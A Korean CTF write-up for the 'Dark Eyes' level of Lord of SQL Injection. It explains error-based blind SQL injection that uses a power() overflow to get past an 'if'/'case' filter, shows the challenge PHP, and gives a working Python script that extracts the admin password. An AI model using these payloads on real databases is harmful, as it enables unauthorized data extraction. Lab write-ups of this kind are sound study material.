---
layout: default
title: Dark Eyes
parent: Load Of SQL Injection
nav_order: 22
---

# Dark Eyes

Error Based Blind SQL Injection 문제다.

하지만 if가 필터링 되어있어, error를 내는 다른 방법이 필요하다.

예를들어, power(a,b)라는 함수는 a의 b 제곱을 나타내는 함수인데, 크기가 너무 커지면 Error가 나오게 된다.

이를 이용해 power((조건식)+1,999999999) 와 같은 쿼리를 넣으면 만약 조건식이 True일 경우, Auto Type Cast에 의해 2의 999999999 제곱을 구해야 하기 때문에 오류가 나게 된다.

이러한 함수를 이용해 Error Based Blind SQL Injection을 실행하면 풀 수 있다.

```php
<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit();
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
  highlight_file(__FILE__);
?>
```

python으로 툴을 짜 해결할 수 있다.

```python
import urllib, urllib2, cookielib, re, ssl, time
key=''
length=0
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders={('User-agent','Mozila/5.0(compatible;MSIE 5.5;Windows NT)')}

loginUrl2='https://los.eagle-jump.org/?login'
login_form={"id":"los_id","pw":"los_pw"}
login_form=urllib.urlencode(login_form)
reqLogin = opener.open('https://los.eagle-jump.org/?login',login_form)
url = 'https://los.eagle-jump.org/gate.php'
req=opener.open(url)

print 'start Blind SQL Injection'
print "search key's length"
while 1:
    length=length+1
    url = "https://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw=%%27 || id='admin' and power(((length(pw))%%3E%d)%%2b1,999999999)%%23"%(length)
    print url
    resp=opener.open(url)
    rresp=resp.read()
    find=re.findall("highlight_file",rresp)
    if find:
        break
print length

print 'search key.'
lenck=1
while 1:
    subkey = 31
    for x in range(96):
        subkey=subkey+1
        hexkey=hex(subkey);
	if hexkey=="0x25":
		subkey=subkey+1
		hexkey=hex(subkey)
        url="https://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw=%%27 || id='admin' and power(((substr(pw,%d,1))%%3E%s)%%2b1,999999999)%%23" %(lenck,hexkey)
        print url
        resp=opener.open(url)
        rresp=resp.read()
        find=re.findall("highlight_file",rresp)
        if find:
            print 'find'
            key=key+chr(subkey)
            break
    lenck=lenck+1
    if lenck-1==length:
        break

print 'find key.'
print key.lower()
```